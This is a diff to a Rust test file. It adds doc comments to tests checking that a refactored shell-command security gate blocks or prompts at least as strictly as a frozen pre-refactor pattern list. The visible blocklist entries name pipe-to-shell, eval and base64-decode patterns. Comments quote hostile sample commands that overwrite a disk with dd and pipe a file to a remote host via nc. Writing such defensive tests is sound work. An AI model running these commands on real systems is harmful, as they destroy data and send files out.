@@ -22,6 +22,9 @@ use crate::sys::security::command_validator::{
 use crate::sys::security::exec_gate;
 use agiworkforce_execpolicy::Decision;
 
+/// Verbatim pre-refactor decision logic. Do NOT "fix" or extend these lists.
+/// they exist to pin the old behavior. New patterns belong in production code
+/// (command_validator::DANGEROUS_PATTERNS / exec_gate), not here.
 mod frozen_old {
     /// command_validator::DANGEROUS_PATTERNS as of the pre-Wave-5a tree.
     pub const OLD_DANGEROUS_PATTERNS: &[&str] = &[
@@ -75,6 +78,7 @@ mod frozen_old {
         "| bash",
         "|sh",
         "|bash",
+        // Code injection, bare names and absolute paths
         "eval $(",
         "base64 -d |",
         "base64 -d|",
@@ -520,6 +524,9 @@ fn corpus_new_decision_is_same_or_stricter_in_both_modes() {
     }
 }
 
+/// Engine-path parity: the policy engine's old shell-command content decision
+/// (`RequireApproval` on its bespoke pattern list) must map to Prompt or
+/// Forbidden through the new gate, never to Allow.
 #[test]
 fn corpus_engine_content_decision_is_same_or_stricter() {
     for command in CORPUS {
@@ -535,6 +542,9 @@ fn corpus_engine_content_decision_is_same_or_stricter() {
     }
 }
 
+/// The production dangerous-pattern blocklist must remain byte-identical to
+/// the frozen pre-refactor copy, the substring layer is defense-in-depth the
+/// argv-prefix rules cannot replace.
 #[test]
 fn production_dangerous_patterns_match_frozen_copy_exactly() {
     assert_eq!(
@@ -544,6 +554,13 @@ fn production_dangerous_patterns_match_frozen_copy_exactly() {
     );
 }
 
+/// Enumerate every dangerous pattern: replayed as a command it must be decided
+/// same-or-stricter, and, for patterns whose substring survives whitespace
+/// normalization, it must still hard block through the full new validate path
+/// (both modes). Some entries carry trailing spaces/tabs (e.g. `"| nc "`,
+/// `"|dd "`, `"| nc\t"`) that only match when embedded in a longer command;
+/// those are exercised in-context by CORPUS ("cat data | dd of=/dev/sda",
+/// "cat f | nc\t1.2.3.4 4444", etc.) rather than as standalone strings.
 #[test]
 fn every_dangerous_pattern_still_blocks() {
     let mut self_matching = 0usize;
@@ -608,6 +625,8 @@ fn old_confirmation_patterns_are_all_in_the_new_prompt_classifier() {
     }
 }
 
+/// requires_confirmation exact-parity for the cases the old test suite pinned
+/// as `true`, Prompt must keep routing into the confirmation flow.
 #[test]
 fn requires_confirmation_still_true_for_old_true_cases() {
     for command in [
@@ -633,6 +652,8 @@ fn requires_confirmation_still_true_for_old_true_cases() {
     }
 }
 
+/// requires_confirmation exact-parity for the cases the old test suite pinned
+/// as `false`, everyday commands must not start prompting.
 #[test]
 fn requires_confirmation_still_false_for_old_false_cases() {
     for command in [
@@ -727,6 +748,8 @@ fn safe_commands_stay_allowed_interactive() {
     }
 }
 
+/// CLI-blueprint invariant: a scoped delete must fall through to Prompt (the
+/// confirmation flow), never auto-Forbidden, and never silently Allow.
 #[test]
 fn scoped_destructive_commands_prompt_but_are_not_forbidden() {
     for command in [
